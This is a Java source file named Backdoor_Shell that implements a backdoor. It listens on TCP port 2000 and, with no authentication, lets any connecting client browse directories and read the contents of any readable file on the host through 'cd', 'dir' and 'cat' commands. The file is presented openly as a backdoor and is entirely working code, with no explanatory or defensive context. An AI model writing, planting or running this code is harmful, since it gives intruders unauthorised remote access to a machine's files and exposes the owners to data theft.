import java.io.*;
import java.net.*;

public class Backdoor_Shell {

	public static void main(String[] args) throws IOException {
		ServerSocket serverSocket = new ServerSocket(2000);
		
		while(true) {
			Socket clientSocket = serverSocket.accept();
			System.out.println("Client connected...");
			
			BufferedReader reader = new BufferedReader(new InputStreamReader(clientSocket.getInputStream()));
			PrintWriter writer = new PrintWriter(clientSocket.getOutputStream(), true);
			
			String currentDir = System.getProperty("user.dir");
			writer.println("Command Prompt");
			
            String currentDirectory = System.getProperty("user.dir");
            writer.println("Current directory: " + currentDirectory);
            
            String inputLine;
            while ((inputLine = reader.readLine()) != null) {
                String[] tokens = inputLine.split(" ");
                String command = tokens[0];

                if (command.equals("cd")) {
                    String directory = tokens[1];
                    if (directory.equals(".")) {
                       
                    } else if (directory.equals("~")) {
                        
                        currentDir = System.getProperty("user.dir");
                        writer.println("Current directory changed to: " + currentDir);
                    } else if (directory.equals("..")) {
                        // Move up one directory if possible
                        File parent = new File(currentDir).getParentFile();
                        if (parent == null) {
                            writer.println("Already at root directory");
                        } else {
                            currentDir = parent.getAbsolutePath();
                            writer.println("Current directory changed to: " + currentDir);
                        }
                    } else {
                       
                        File file = new File(currentDir, directory);
                        if (file.isDirectory()) {
                            currentDir = file.getAbsolutePath();
                            writer.println("Current directory changed to: " + currentDir);
                        } else {
                            writer.println(directory + " is not a directory");
                        }
                    }
                
            	} else if (command.equals("dir")) {
                    File dir = new File(currentDir);
                    File[] files = dir.listFiles();
                    for (File file : files) {
                        if (file.isDirectory()) {
                        	writer.println(file.getName() + "\t<DIR>");
                        } else {
                        	writer.println(file.getName() + "\t<FILE>");
                        }
                    }
                } else if (command.equals("cat")) {
                    String filename = tokens[1];
                    File file = new File(currentDir, filename);
                    if (file.isFile()) {
                        BufferedReader fileReader = new BufferedReader(new FileReader(file));
                        String line;
                        while ((line = fileReader.readLine()) != null) {
                        	writer.println(line);
                        }
                        fileReader.close();
                    } else {
                    	writer.println(filename + " not found");
                    }
                } else {
                	writer.println("Unknown command: " + command);
                }
            }

            clientSocket.close();
        }
    }
}
              

	


